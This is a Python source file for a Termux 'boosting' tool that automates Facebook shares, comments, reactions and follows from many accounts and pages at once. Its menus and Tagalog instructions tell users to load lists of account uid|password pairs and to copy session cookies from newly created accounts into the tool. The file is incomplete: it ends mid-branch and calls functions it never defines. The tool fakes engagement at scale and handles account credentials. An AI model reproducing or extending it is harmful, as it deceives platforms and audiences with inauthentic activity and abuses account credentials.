import random
import uuid
import requests
import json
import re
import time
import os
import threading
from concurrent.futures import ThreadPoolExecutor
from threading import Semaphore
#++++++++++++++COLORS+++++++++++++#
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
S = '\033[96;1m'
N = '\x1b[0m'
M ='\033[90m'
T ='\033[95m'
P = '\033[95;1m'
C='\033[3m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
PURPLE ='\x1b[38;5;46m'
BLACK="\033[1;30m"
GREY ='\033[90m'
MAGENTA ='\033[95m'
EXTRA ='\x1b[38;5;208m'
CGREEN= '\033[3m'
#++++++++++++LOGO+++++++++++++#
logo_main=(f"""{P}                
{BLUE}▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
{M}
░██╗░░░░░░░██╗░█████╗░██████╗░██████╗░██╗░█████╗░██████╗░
░██║░░██╗░░██║██╔══██╗██╔══██╗██╔══██╗██║██╔══██╗██╔══██╗
░╚██╗████╗██╔╝███████║██████╔╝██████╔╝██║██║░░██║██████╔╝
░░████╔═████║░██╔══██║██╔══██╗██╔══██╗██║██║░░██║██╔══██╗
░░╚██╔╝░╚██╔╝░██║░░██║██║░░██║██║░░██║██║╚█████╔╝██║░░██║
░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚═╝
{BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{R}❏ {M}𝗨𝘀𝗲𝘀               {W}[{R}•{W}]{M} 𝐁𝐨𝐨𝐬𝐭𝐢𝐧𝐠 𝐓𝐨𝐨𝐥𝐬
{R}❏ {M}𝗧𝗼𝗼𝗹𝘀              {W}[{R}•{W}]{M} 𝐏𝐚𝐢𝐝/PREMIUM 
{R}❏ {M}𝗩𝗲𝗿𝘀𝗶𝗼𝗻            {W}[{R}•{W}]{M} ▮▮▮▮•▮▯▯ 4.1
{BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  {B}              ╭───────────────────────────╮
                  {R}Author  : {B} Eyac Policarps {B}
                ╰───────────────────────────╯
{WHITE}        ╔════════════════════▣◎▣════════════════════╗ """)
##########LOGO SHARE##########
logo_share=(f"""{B}                
{BLUE}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
         {R}/$$$$$$  /$$   /$$  /$$$$$$  /$$$$$$$  /$$$$$$$$
        /$$__  $$| $$  | $$ /$$__  $$| $$__  $$| $$_____/
       | $$  \__/| $$  | $$| $$  \ $$| $$  \ $$| $$      
       |  $$$$$$ | $$$$$$$$| $$$$$$$$| $$$$$$$/| $$$$$   
        \____  $$| $$__  $$| $$__  $$| $$__  $$| $$__/   
        /$$  \ $$| $$  | $$| $$  | $$| $$  \ $$| $$      
       |  $$$$$$/| $$  | $$| $$  | $$| $$  | $$| $$$$$$$$
       \______/ |__/  |__/|__/  |__/|__/  |__/|________/
 
{BLUE}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
{R}❏ {M}𝗨𝘀𝗲𝘀               {W}[{R}•{W}]{M} 𝐁𝐨𝐨𝐬𝐭𝐢𝐧𝐠 𝐓𝐨𝐨𝐥𝐬
{R}❏ {M}𝗧𝗼𝗼𝗹𝘀              {W}[{R}•{W}]{M} 𝐏𝐚𝐢𝐝/PREMIUM 
{R}❏ {M}𝗩𝗲𝗿𝘀𝗶𝗼𝗻            {W}[{R}•{W}]{M} ▮▮▮▮•▮▯▯ 4.1
{BLUE}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬""")
#########LOGO REACT##########
logo_react=(f"""{R}                
{BLUE}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
         {G}/$$$$$$$  /$$$$$$$$  /$$$$$$   /$$$$$$  /$$$$$$$$
        | $$__  $$| $$_____/ /$$__  $$ /$$__  $$|__  $$__/
        | $$  \ $$| $$      | $$  \ $$| $$  \__/   | $$   
        | $$$$$$$/| $$$$$   | $$$$$$$$| $$         | $$   
        | $$__  $$| $$__/   | $$__  $$| $$         | $$   
        | $$  \ $$| $$      | $$  | $$| $$    $$   | $$   
        | $$  | $$| $$$$$$$$| $$  | $$|  $$$$$$/   | $$   
        |__/  |__/|________/|__/  |__/ \______/    |__/   
 
{BLUE}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
{R}❏ {M}𝗨𝘀𝗲𝘀               {W}[{R}•{W}]{M} 𝐁𝐨𝐨𝐬𝐭𝐢𝐧𝐠 𝐓𝐨𝐨𝐥𝐬
{R}❏ {M}𝗧𝗼𝗼𝗹𝘀              {W}[{R}•{W}]{M} 𝐏𝐚𝐢𝐝/PREMIUM 
{R}❏ {M}𝗩𝗲𝗿𝘀𝗶𝗼𝗻            {W}[{R}•{W}]{M} ▮▮▮▮•▮▯▯ 4.1
{BLUE}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬""")
#########LOGO COMMENT#######
logo_cmnt=(f"""{R}                
{BLUE}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
             {G}/$$$$$$  /$$      /$$ /$$   /$$ /$$$$$$$$
            /$$__  $$| $$$    /$$$| $$$ | $$|__  $$__/
           | $$  \__/| $$$$  /$$$$| $$$$| $$   | $$   
           | $$      | $$ $$/$$ $$| $$ $$ $$   | $$   
           | $$      | $$  $$$| $$| $$  $$$$   | $$   
           | $$    $$| $$\  $ | $$| $$\  $$$   | $$   
           |  $$$$$$/| $$ \/  | $$| $$ \  $$   | $$   
            \______/ |__/     |__/|__/  \__/   |__/  
 
{BLUE}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
{R}❏ {M}𝗨𝘀𝗲𝘀               {W}[{R}•{W}]{M} 𝐁𝐨𝐨𝐬𝐭𝐢𝐧𝐠 𝐓𝐨𝐨𝐥𝐬
{R}❏ {M}𝗧𝗼𝗼𝗹𝘀              {W}[{R}•{W}]{M} 𝐏𝐚𝐢𝐝/PREMIUM 
{R}❏ {M}𝗩𝗲𝗿𝘀𝗶𝗼𝗻            {W}[{R}•{W}]{M} ▮▮▮▮•▮▯▯ 4.1
{BLUE}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬""")
############LOGO FOLLOW###########
logo_follow=(f"""{R}                
{BLUE}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 {R}/$$$$$$$$ /$$$$$$  /$$       /$$        /$$$$$$  /$$      /$$
| $$_____//$$__  $$| $$      | $$       /$$__  $$| $$  /$ | $$
| $$     | $$  \ $$| $$      | $$      | $$  \ $$| $$ /$$$| $$
| $$$$$  | $$  | $$| $$      | $$      | $$  | $$| $$/$$ $$ $$
| $$__/  | $$  | $$| $$      | $$      | $$  | $$| $$$$_  $$$$
| $$     | $$  | $$| $$      | $$      | $$  | $$| $$$/ \  $$$
| $$     |  $$$$$$/| $$$$$$$$| $$$$$$$$|  $$$$$$/| $$/   \  $$
|__/      \______/ |________/|________/ \______/ |__/     \__/
                                                    
{BLUE}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
{R}❏ {M}𝗨𝘀𝗲𝘀               {W}[{R}•{W}]{M} 𝐁𝐨𝐨𝐬𝐭𝐢𝐧𝐠 𝐓𝐨𝐨𝐥𝐬
{R}❏ {M}𝗧𝗼𝗼𝗹𝘀              {W}[{R}•{W}]{M} 𝐏𝐚𝐢𝐝/PREMIUM 
{R}❏ {M}𝗩𝗲𝗿𝘀𝗶𝗼𝗻            {W}[{R}•{W}]{M} ▮▮▮▮•▮▯▯ 4.1
{BLUE}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬""")
############LOGO DISCRIPTION###########
logo_discription=(f"""{G}                
{BLUE}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬

██████╗░███████╗░██████╗░█████╗░
██╔══██╗██╔════╝██╔════╝██╔══██╗
██║░░██║█████╗░░╚█████╗░██║░░╚═╝
██║░░██║██╔══╝░░░╚═══██╗██║░░██╗
██████╔╝███████╗██████╔╝╚█████╔╝
╚═════╝░╚══════╝╚═════╝░░╚════╝░
                                                    
{BLUE}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
{R}❏ {M}𝗨𝘀𝗲𝘀               {W}[{R}•{W}]{M} 𝐁𝐨𝐨𝐬𝐭𝐢𝐧𝐠 𝐓𝐨𝐨𝐥𝐬
{R}❏ {M}𝗧𝗼𝗼𝗹𝘀              {W}[{R}•{W}]{M} 𝐏𝐚𝐢𝐝/PREMIUM 
{R}❏ {M}𝗩𝗲𝗿𝘀𝗶𝗼𝗻            {W}[{R}•{W}]{M} ▮▮▮▮•▮▯▯ 4.1
{BLUE}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬""")
def linex():
    print(f'{BLUE}▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰')
##########
ses=requests.Session()
kom1 = ("GOOD LUCK")
add_token = []
accounts = []
#++++++++++MAIN+++++++++#
def check_token(access_token, total_pages):
    try:
        response = requests.get(f'https://graph.facebook.com/me/accounts?access_token={access_token}').json()
        if 'data' in response:
            total_pages += len(response['data'])
    except Exception as e:
        print(f"{B}Error: {e}")

def main():
    global status
    os.system('clear')
    print(logo_main)
    try:
        y = ("***")
        if y == ("***"):
            if os.path.isfile("token_zari.txt"):
                status = (f"{G} Log in Succesfully ")
            else:
                status = (f"{R}No account")
            print(f'{G}           Facebook account: {W}({status}{W}) ')
            if os.path.isfile("token_zari.txt"):
                status = (f" {G } ᯤ ")
            else:
                status = (f"{R} ᯤ ")
            print(f'{G}                    Status : {W}({status}{W}) ')
            linex()
            print(f' {R}❏{M}[01] LOG IN                {R}❏{M} 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 ')                   
            print(f' {R}❏{M}[02] AUTO SHARE            {R}❏{M} 𝗖𝗢𝗢𝗞𝗜𝗘𝗦 𝗟𝗢𝗚 𝗜𝗡  ')     
            print(f' {R}❏{M}[03] AUTO COMMENTS         {R}❏{M} CUSTOM  ')
            print(f' {R}❏{M}[04] AUTO REACT            {R}❏{M} 𝗣𝗛𝗢𝗧𝗢 𝗥𝗘𝗘𝗟𝗦 𝗣𝗢𝗦𝗧 ')          
            print(f' {R}❏{M}[05] AUTO FOLLOW           {R}❏{M} 𝗣𝗔𝗚𝗘 𝗢𝗥 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 ')         
            print(f' {R}❏{M}[06] REMOVE TOKEN          {R}❏{M} 𝗧O 𝗥𝗘𝗠𝗢𝗩𝗘 𝗔𝗖𝗖𝗢𝗨𝗡𝗧 ')
            print(f' {R}❏{M}[00] EXIT TOOLS            {R}❏{M} 𝗘𝗫𝗜𝗧 ')
            print(f' {R}❏{M}[09] INSTRUCTIONS          {R}❏{M} GUIDE.                                         ')
            linex()
            opt = input(f'{W}𝗖𝗛𝗢𝗢𝗦𝗘 : ')
            linex()
            #####AUTO SHARE######
            if opt in ['1','01']:
                if os.path.isfile("token_zari.txt"):
                    os.system('clear')
                    print(logo_main)
                    print(f"{B}Remove token before you can login again!")
                    linex()
                    time.sleep(3)
                    main()
                    return
                get_token()
                main()
            elif opt in ['2', '02']:
                bot_share()
            #####AUTO COMMENT######
            elif opt in ['3', '03']:
                os.system('clear')
                print(logo_cmnt)
                count = 0
                total_pages = 0
                if not os.path.isfile("token_zari.txt"):
                    print(f"{B}LOGIN FIRST!")
                    time.sleep(3)
                    main()
                    return
                try:
                    with open("token_zari.txt","r") as f:
                        add_token = [line.strip() for line in f.readlines()]
                    threads = []
                    for access_token in add_token:
                        t = threading.Thread(target=lambda: check_token(access_token, total_pages))
                        t.start()
                        threads.append(t)
                    for t in threads:
                        t.join()
                except Exception as e:
                    print(f"{B}Error: {e}")
                print(f"{R}TAKE NOTE: FB PAGES - {total_pages}")
                print(f"{R}TAKE NOTE: FB ACCOUNT - {len(add_token)}")
                linex()
                print(f"{R}[1] Auto Comment (FB Post) ")
                print(f"{R}[0] Back to main menu ")
                linex()
                method = input(f"{R}Choose: ")
                linex()
                if method == '1':
                    print(f"{R}[1] Comment using Facebook Account")
                    print(f"{R}[2] Comment using Facebook Page")
                    print(f"{R}[3] Comment using Facebook Account and Page")
                    print(f"{R}[0] Back to main menu ")
                    linex()
                    account_type = input(f"{R}Choose: ")
                    linex()
                    if account_type == '1':
                        os.system('clear')
                        print(logo_cmnt)
                        account_id = input(f"{R}Post Link: ")
                        linex()
                        extracted = extract_facebook_post_info(account_id)
                        formatted_id = extract_ids(extracted)
                        if account_id == "" or account_id == " " or "https://www.facebook.com/" not in account_id:
                            exit(f"{B}Invalid post link!")
                        write = input(f"{R}Write comment: ")
                        linex()
                        comment_limit = int(input(f"{R}Comment Limit: "))
                        linex()
                        perform_comment_acc(formatted_id, write, comment_limit)
                    elif account_type == '2':
                        os.system('clear')
                        print(logo_cmnt)
                        account_id = input(f"{R}Post Link: ")
                        linex()
                        extracted = extract_facebook_post_info(account_id)
                        formatted_id = extract_ids(extracted)
                        if account_id == "" or account_id == " " or "https://www.facebook.com/" not in account_id:
                            exit(f"{B}Invalid post link!")
                        write = input(f"{R}Write comment: ")
                        linex()
                        comment_limit = int(input(f"{R}Comment Limit: "))
                        linex()
                        perform_comment(formatted_id, write, comment_limit)
                    elif account_type == '3':
                        os.system('clear')
                        print(logo_cmnt)
                        account_id = input(f"{R}Post link: ")
                        linex()
                        extracted = extract_facebook_post_info(account_id)
                        formatted_id = extract_ids(extracted)
                        if account_id == "" or account_id == " " or "https://www.facebook.com/" not in account_id:
                            exit(f"{B}Invalid post link!")
                        write = input(f"{R}Write comment: ")
                        linex()
                        comment_limit = int(input(f"{R}Comment Limit: "))
                        linex()
                        perform_comment_mix(formatted_id, write, comment_limit)
                    elif account_type == '0':
                        main()
                    else:
                        sys.exit(f"{B}Invalid")
                elif method == '0':
                	main()
	            ########AUTO REACT######
            elif opt in ['4', '04']:
                os.system('clear')
                print(logo_react)
                count = 0
                total_pages = 0
                if not os.path.isfile("token_zari.txt"):
                    print(f"{R}LOGIN FIRST!")
                    time.sleep(3)
                    main()
                    return
                try:
                    with open("token_zari.txt","r") as f:
                        add_token = [line.strip() for line in f.readlines()]
                    threads = []
                    for access_token in add_token:
                        t = threading.Thread(target=lambda: check_token(access_token, total_pages))
                        t.start()
                        threads.append(t)
                    for t in threads:
                        t.join()
                except Exception as e:
                    print(f"{B}Error: {e}")
                print(f"{R}TAKE NOTE: FB PAGES - {total_pages}")
                print(f"{R}TAKE NOTE: FB ACCOUNT - {len(add_token)}")
                linex()
                print(f"{R}[1] Auto React (FB Post) ")
                print(f"{R}[2] Auto React (FB Reels) ")
                print(f"{R}[3] Auto React (DP & Cover) ")
                print(f"{R}[0] Back to main menu ")
                linex()
                method = input(f"{R}Choose: ")
                linex()
                if method == '1':
                    print(f"{R}[1] React using Facebook Account")
                    print(f"{R}[2] React using Facebook Page")
                    print(f"{R}[3] React using Facebook Account and Page")
                    print(f"{R}[0] Back to main menu ")
                    linex()
                    account_type = input(f"{R}Choose: ")
                    linex()
                    if account_type == '1':
                    	os.system('clear')
                    	print(logo_react)
                    	account_id = input(f"{R}Post Link: ")
                    	linex()
                    	extracted = extract_facebook_post_info(account_id)
                    	formatted_id = extract_ids(extracted)
                    	if account_id == "" or account_id == " " or "https://www.facebook.com/" not in account_id:
                	        exit(f"{B}Invalid post link!")
                    	selected_reaction = input(f"{R}Reaction Type: ")
                    	linex()
                    	reaction_limit = int(input(f"{R}Reaction Limit: "))
                    	linex()
                    	perform_reaction_acc(formatted_id, selected_reaction, reaction_limit)
                    elif account_type == '2':
                    	os.system('clear')
                    	print(logo_react)
                    	account_id = input(f"{R}Post Link: ")
                    	linex()
                    	extracted = extract_facebook_post_info(account_id)
                    	formatted_id = extract_ids(extracted)
                    	if account_id == "" or account_id == " " or "https://www.facebook.com/" not in account_id:
                	        exit(f"{B}Invalid post link!")
                    	selected_reaction = input(f"{R}Reaction Type: ")
                    	linex()
                    	reaction_limit = int(input(f"{R}Reaction Limit: "))
                    	linex()
                    	perform_reaction(formatted_id, selected_reaction, reaction_limit)
                    elif account_type == '3':
                    	os.system('clear')
                    	print(logo_react)
                    	account_id = input(f"{R}Post Link: ")
                    	linex()
                    	extracted = extract_facebook_post_info(account_id)
                    	formatted_id = extract_ids(extracted)
                    	if account_id == "" or account_id == " " or "https://www.facebook.com/" not in account_id:
                	        exit(f"{B}Invalid post link!")
                    	selected_reaction = input(f"{R}Reaction Type: ")
                    	linex()
                    	reaction_limit = int(input(f"{R}Reaction Limit: "))
                    	linex()
                    	perform_reaction_mix(formatted_id, selected_reaction, reaction_limit)
                    elif account_type == '0':
                    	main()
                    else:
                    	sys.exit(f"{B}Invalid")
                elif method == '2':
                    print(f"{R}[1] React using Facebook Account")
                    print(f"{R}[2] React using Facebook Page")
                    print(f"{R}[3] React using Facebook Account and Page")
                    print(f"{R}[0] Back to main menu ")
                    linex()
                    account_type = input(f"{R}Choose: ")
                    linex()
                    if account_type == '1':
                    	os.system('clear')
                    	print(logo_react)
                    	account_id = input(f"{R}Reel Link: ")
                    	linex()
                    	reel_id = get_reel_id(account_id)
                    	if account_id == "" or account_id == " " or "https://www.facebook.com/" not in account_id:
                	        exit(f"{B}Invalid reel link!")
                    	selected_reaction = input(f"{R}Reaction Type: ")
                    	linex()
                    	reaction_limit = int(input(f"{R}Reaction Limit: "))
                    	linex()
                    	perform_reaction_acc_reel(reel_id, selected_reaction, reaction_limit)
                    elif account_type == '2':
                    	os.system('clear')
                    	print(logo_react)
                    	account_id = input(f"{R}Reel Link: ")
                    	linex()
                    	reel_id = get_reel_id(account_id)
                    	if account_id == "" or account_id == " " or "https://www.facebook.com/" not in account_id:
                	        exit(f"{B}Invalid reel link!")
                    	selected_reaction = input(f"{R}Reaction Type: ")
                    	linex()
                    	reaction_limit = int(input(f"{R}Reaction Limit: "))
                    	linex()
                    	perform_reaction_page_reel(reel_id, selected_reaction, reaction_limit)
                    elif account_type == '3':
                    	os.system('clear')
                    	print(logo_react)
                    	account_id = input(f"{R}Reel Link: ")
                    	linex()
                    	reel_id = get_reel_id(account_id)
                    	if account_id == "" or account_id == " " or "https://www.facebook.com/" not in account_id:
                	        exit(f"{B}Invalid reel link!")
                    	selected_reaction = input(f"{R}Reaction Type: ")
                    	linex()
                    	reaction_limit = int(input(f"{R}Reaction Limit: "))
                    	linex()
                    	perform_reaction_mix_reel(reel_id, selected_reaction, reaction_limit)
                    elif account_type == '0':
                    	main()
                    else:
                    	sys.exit(f"{B}Invalid")
                elif method == '3':
                    print(f"{R}[1] React using Facebook Account")
                    print(f"{R}[2] React using Facebook Page")
                    print(f"{R}[3] React using Facebook Account and Page")
                    print(f"{R}[0] Back to main menu ")
                    linex()
                    account_type = input(f"{R}Choose: ")
                    linex()
                    if account_type == '1':
                    	os.system('clear')
                    	print(logo_react)
                    	account_id = input(f"{R}DP/Cover Link: ")
                    	linex()
                    	extracted = get_photo_id(account_id)
                    	if account_id == "" or account_id == " " or "https://www.facebook.com/" not in account_id:
                	        exit(f"{B}Invalid DP/Cover link!")
                    	selected_reaction = input(f"{R}Reaction Type: ")
                    	linex()
                    	reaction_limit = int(input(f"{R}Reaction Limit: "))
                    	linex()
                    	perform_reaction_acc_dp_cover(extracted, selected_reaction, reaction_limit)
                    elif account_type == '2':
                    	os.system('clear')
                    	print(logo_react)
                    	account_id = input(f"{R}DP/Cover Link: ")
                    	linex()
                    	extracted = get_photo_id(account_id)
                    	if account_id == "" or account_id == " " or "https://www.facebook.com/" not in account_id:
                	        exit(f"{B}Invalid DP/Cover link!")
                    	selected_reaction = input(f"{R}Reaction Type: ")
                    	linex()
                    	reaction_limit = int(input(f"{R}Reaction Limit: "))
                    	linex()
                    	perform_reaction_pg_dp_cover(extracted, selected_reaction, reaction_limit)
                    elif account_type == '3':
                    	os.system('clear')
                    	print(logo_react)
                    	account_id = input(f"{R}DP/Cover Link: ")
                    	linex()
                    	extracted = get_photo_id(account_id)
                    	if account_id == "" or account_id == " " or "https://www.facebook.com/" not in account_id:
                	        exit(f"{B}Invalid DP/Cover link!")
                    	selected_reaction = input(f"{R}Reaction Type: ")
                    	linex()
                    	reaction_limit = int(input(f"{R}Reaction Limit: "))
                    	linex()
                    	perform_reaction_mix_dp_cover(extracted, selected_reaction, reaction_limit)
                    elif account_type == '0':
                    	main()
                    else:
                    	sys.exit(f"{R}Invalid")
                elif method == '0':
                	main() 
	       ####AUTO FOLLOW#####
            elif opt in ['5', '05']:
                os.system('clear')
                print(logo_follow)
                count = 0
                total_pages = 0
                if not os.path.isfile("token_zari.txt"):
                    print(f"{B}LOGIN FIRST!")
                    time.sleep(3)
                    main()
                    return
                try:
                    with open("token_zari.txt","r") as f:
                        add_token = [line.strip() for line in f.readlines()]
                    threads = []
                    for access_token in add_token:
                        t = threading.Thread(target=lambda: check_token(access_token, total_pages))
                        t.start()
                        threads.append(t)
                    for t in threads:
                        t.join()
                except Exception as e:
                    print(f"{R}Error: {e}")
                print(f"{R}TAKE NOTE: FB PAGES - {total_pages}")
                print(f"{R}TAKE NOTE: FB ACCOUNT - {len(add_token)}")
                linex()
                print(f"{R}[1] Follow using Facebook Account")
                print(f"{R}[2] Follow using Facebook Page")
                print(f"{R}[3] Follow using Facebook page and account ")
                print(f"{R}[0] Back to main menu ")
                linex()
                account_type = input(f"{R}Choose: ")
                linex()
                if account_type == '1':
                	os.system('clear')
                	print(logo_follow)
                	account_id = input(f"{R}Enter UID: ")
                	linex()
                	if account_id == "" or account_id == " ":
                	    exit(f"{B}Invalid UID")
                	num_pages = int(input(f"{R}Follow Limit: "))
                	linex()
                	follow_accounts(account_id, num_pages)
                elif account_type == '2':
                	os.system('clear')
                	print(logo_follow)
                	account_id = input(f"{R} Enter UID: ")
                	linex()
                	if account_id == "" or account_id == " ":
                	    exit(f"{B}Invalid UID")
                	num_pages = int(input(f"{R}Follow Limit: "))
                	linex()
                	follow_pages(account_id, num_pages)
                elif account_type == '3':
                	os.system('clear')
                	print(logo_follow)
                	account_id = input(f"{R} Enter UID: ")
                	linex()
                	if account_id == "" or account_id == " ":
                	    exit(f"{B}Invalid UID")
                	num_pages = int(input(f"{R}Follow Limit: "))
                	linex()
                	follow_accounts_mix(account_id, num_pages)
                elif account_type == '0':
                	main()
                else:
                    sys.exit(f"{B}Invalid")
            elif opt in ['6', '06']:
                os.system('clear')
                print(logo_main)
                status = (f"{B}Inactive")
                print(f'{R}                     Status: {Y}({status}{Y}) ')
                linex()
                print(f'{R}Tokens have been removed.')
                linex()
                os.remove("token_zari.txt")
                time.sleep(5)
                main()
                	       ####AUTO DISCRIPTION#####
            elif opt in ['9', '09']:
                os.system('clear')
                print(logo_discription)
                count = 1
                total_pages = 1

                try:
                    with open("token_zari.txt","r") as f:
                        add_token = [line.strip() for line in f.readlines()]
                    threads = []
                    for access_token in add_token:
                        t = threading.Thread(target=lambda: check_token(access_token, total_pages))
                        t.start()
                        threads.append(t)
                    for t in threads:
                        t.join()
                except Exception as e:
                    print(f"{R}Error: {e}")
                print(f"{R}TAKE NOTE: Please read Carefully to understand ")
                print(f"{R}TAKE NOTE : RED color is important ")
                linex()
                print(f"{G}[1] How to add account ")
                print(f"{G}[2] How to Boost Reaction  ")
                print(f"{G}[3] How to Boost Followers ")
                print(f"{G}[4] How to Boost Comments ")
                print(f"{G}[5] How to Boost Share ")
                print(f"{R}[0] Back to main menu ")
                linex()
                account_type = input(f"{R}Choose: ")
                linex()
                if account_type == '1':
                	os.system('clear')
                	print(logo_follow)
                	account_id = input(f"{G}{B} #1: {G} Pumunta lamang sa {R} QUICK EDIT {G} app at gumawa ng pani bagong file at pangalanan ito ng {R} ( fb.txt ) {B} #2 : {G} E paste ang iyong mga account na naka FORMAT ito nang {R} uid|password..                  {Y} Example uid|password {R} 6782040592|Sythe13  {B} #3 :{G}Pumunta ng termux app - choose 1 ( login ) e type ito {R} ( /sdcard/fb.txt ){G} and done ")
                	linex()
                	if account_id == "" or account_id == " ":
                	    exit(f"{B}Invalid UID")
                	num_pages = int(input(f"{R}Follow Limit: "))
                	linex()
                	follow_accounts(account_id, num_pages)
                elif account_type == '2':
                	os.system('clear')
                	print(logo_follow)
                	account_id = input(f"{G} Choose #4  to auto Reaction {G} For auto reaction {R}[1]{G} Para sa post only {R}[2]{G} Para sa Reels {R}[3]{G} Para sa Photos | E type kung anu yung e boboost mo 1,2,3 {B} #2: {G}Always choose {R}#1 {B} #3:{G} E paste yung link na e boboost nyu {B} #4: {G} Ilalagay ang reaction na gusto mo {R}HAHA,SAD,LIKE,HAPPY,LOVE {G} Dapat naka big letter ito {B} #5: {G} Ilalagay kung ilan target nito   ")
                	linex()
                	if account_id == "" or account_id == " ":
                	    exit(f"{B}Invalid UID")
                	num_pages = int(input(f"{R}Follow Limit: "))
                	linex()
                	follow_pages(account_id, num_pages)
                elif account_type == '3':
                	os.system('clear')
                	print(logo_follow)
                	account_id = input(f"{G} Choose #5 to Auto followers {B} #2 : {G} Choose #1  For Using Facebook account  {B} #3 {G} Enter the Uid {R}NOT A LINK {Y} Example uid {G} ( 67839505078 ) {B} #4 : {G} Tapos lagay kung ilan yung e boboost mo  ")
                	linex()
                elif account_type == '4':
                	os.system('clear')
                	print(logo_follow)
                	account_id = input(f"{G} Choose #3 To auto comments {B} #2 : {G} Choose {R}1 {G} To Fb post {B} #3 : {G} Choose #1 To comments  using Facebook account {B} #4 : {G}  Sulat mo kung anung yung gustong e co-comments mo {B} #5 : {G} ilalagay kung ilan yung{R} gusto mong mag comments ")
                	linex()
                elif account_type == '5':
                	os.system('clear')
                	print(logo_follow)
                	account_id = input(f"{G} Choose #2 to auto share {B} #2 : {G} How to get coockies; pumunta lamang ng {R} Kiwi Browser{G} Create New Facebook account ; Download {R} Cookie dough Extension {G} Next Goto Facebook  home page {R} Click 3 dot na nsa itaas {G} scroll down hanapin ang Cookie dough extension {R} COPY MO {G} paste mo sya sa termux -cookies {B} #3 : {G} POST LINK paste mo {B} #4 : {G} Share limit kung ilan e share  ")
                	linex()
                	if account_id == "" or account_id == " ":
                	    exit(f"{B}Invalid UID")
                	num_pages = int(input(f"{R}Follow Limit: "))
                	linex()
                	follow_accounts_mix(account_id, num_pages)
                elif account_type == '0':
                	main()
                else:
